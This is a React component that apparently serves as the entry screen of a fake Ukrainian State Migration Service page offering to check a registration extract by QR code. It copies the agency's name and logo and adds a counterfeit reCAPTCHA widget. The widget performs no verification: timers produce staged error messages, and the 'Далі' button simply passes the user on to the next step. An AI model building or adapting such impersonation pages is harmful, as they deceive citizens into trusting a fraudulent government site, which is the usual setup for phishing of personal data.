import { useState, useEffect, useRef } from "react";

const Captcha = ({ onPass }: { onPass: () => void }) => {
  const [checked, setChecked] = useState(false);
  const [error, setError] = useState(false);
  const [spinning, setSpinning] = useState(false);
  const timerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const submitTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const startTimer = () => {
    if (timerRef.current) clearTimeout(timerRef.current);
    timerRef.current = setTimeout(() => {
      setChecked(false);
      setError(true);
    }, 2000);
  };

  useEffect(() => {
    startTimer();
    return () => { if (timerRef.current) clearTimeout(timerRef.current); };
  }, []);

  const handleClick = () => {
    if (checked) return;
    if (timerRef.current) clearTimeout(timerRef.current);
    setChecked(true);
    setError(false);
    timerRef.current = setTimeout(() => {
      setChecked(false);
      setError(true);
    }, 3000);
  };

  const handleRetry = () => {
    setError(false);
    setChecked(false);
    startTimer();
  };

  const handleSubmit = () => {
    if (!checked || error || spinning) return;
    if (timerRef.current) clearTimeout(timerRef.current);
    setSpinning(true);
    setTimeout(() => {
      onPass();
    }, 1000);
  };

  return (
    <div style={{ fontFamily: "'Roboto', sans-serif", backgroundColor: "#f0f0f0", minHeight: "100vh" }}>
      {/* Header */}
      <div style={{ backgroundColor: "#1a90d6", padding: "20px", display: "flex", flexDirection: "row", alignItems: "center", gap: "16px" }}>
        <a href="https://dmsu.gov.ua" target="_blank" rel="noopener noreferrer" style={{ display: "block", cursor: "pointer", flexShrink: 0 }}>
          <img
            src="https://cdn.poehali.dev/projects/53635ed7-6b6d-4c81-a7b6-6e64215ca348/bucket/6abd0d20-5f90-43b0-bc4f-7bcb64dcab61.jpeg"
            alt="Логотип ДМС"
            style={{ width: "70px", height: "70px", objectFit: "contain", display: "block", borderRadius: "50%" }}
          />
        </a>
        <div style={{ color: "white", fontWeight: "700", fontSize: "18px", lineHeight: "1.3", letterSpacing: "0.5px" }}>
          ДЕРЖАВНА МІГРАЦІЙНА<br />СЛУЖБА УКРАЇНИ
        </div>
      </div>

      {/* Content */}
      <div style={{ padding: "32px 20px" }}>
        <h2 style={{ fontSize: "22px", fontWeight: "700", color: "#111", marginBottom: "24px", lineHeight: "1.4", textAlign: "center" }}>
          Перевірка наявності витягу місця реєстрації за QR кодом
        </h2>

        {/* reCAPTCHA widget */}
        <div style={{
          border: "1px solid #d3d3d3",
          borderRadius: "3px",
          backgroundColor: "#f9f9f9",
          padding: "12px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          marginBottom: "16px",
          position: "relative",
          minHeight: "74px",
        }}>
          <div style={{ display: "flex", flexDirection: "column", gap: "4px", flex: 1 }}>
            {error && (
              <div style={{ color: "#cc0000", fontSize: "13px", marginBottom: "6px", lineHeight: "1.4" }}>
                Время проверки истекло. Установите флажок ещё раз.
              </div>
            )}
            <div style={{ display: "flex", alignItems: "center", gap: "12px" }}>
              <div
                onClick={error ? handleRetry : handleClick}
                style={{
                  width: "24px",
                  height: "24px",
                  border: `2px solid ${error ? "#cc0000" : "#c1c1c1"}`,
                  borderRadius: "2px",
                  backgroundColor: "white",
                  cursor: "pointer",
                  flexShrink: 0,
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  position: "relative",
                }}
              >
                {spinning && (
                  <div style={{
                    width: "16px", height: "16px", border: "2px solid #4a90d9",
                    borderTopColor: "transparent", borderRadius: "50%",
                    animation: "spin 0.6s linear infinite"
                  }} />
                )}
                {checked && !error && !spinning && (
                  <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
                    <path d="M3 8l4 4 6-7" stroke="#4a90d9" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                )}
              </div>
              <span style={{ fontSize: "14px", color: "#333" }}>Я не робот</span>
            </div>
            {error && (
              <div style={{ fontSize: "11px", color: "#0000EE", textDecoration: "underline", cursor: "pointer", marginTop: "2px" }}>
                Для этого сайта превышена бесплатная квота reCAPTCHA
              </div>
            )}
          </div>

          {/* reCAPTCHA logo */}
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "2px", marginLeft: "12px", flexShrink: 0 }}>
            <svg width="32" height="32" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
              <path d="M32 10
                A22 22 0 0 1 54 32
                L50 32
                A18 18 0 0 0 32 14
                L32 10Z" fill="#4A90E2"/>
              <polygon points="54,24 58,36 46,32" fill="#4A90E2"/>
              <path d="M32 54
                A22 22 0 0 1 10 32
                L14 32
                A18 18 0 0 0 32 50
                L32 54Z" fill="#4A90E2"/>
              <polygon points="10,40 6,28 18,32" fill="#4A90E2"/>
            </svg>
            <span style={{ fontSize: "9px", color: "#555", letterSpacing: "0.5px" }}>reCAPTCHA</span>
            <div style={{ fontSize: "8px", color: "#aaa", textAlign: "center", lineHeight: "1.2" }}>
              Privacy - Terms
            </div>
          </div>
        </div>

        {/* Button */}
        <button
          onClick={handleSubmit}
          style={{
            width: "100%",
            backgroundColor: "#1a90d6",
            color: "white",
            border: "none",
            borderRadius: "3px",
            padding: "16px",
            fontSize: "20px",
            fontWeight: "700",
            cursor: "pointer",
            letterSpacing: "0.5px",
          }}
        >
          Далі
        </button>
      </div>

      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default Captcha;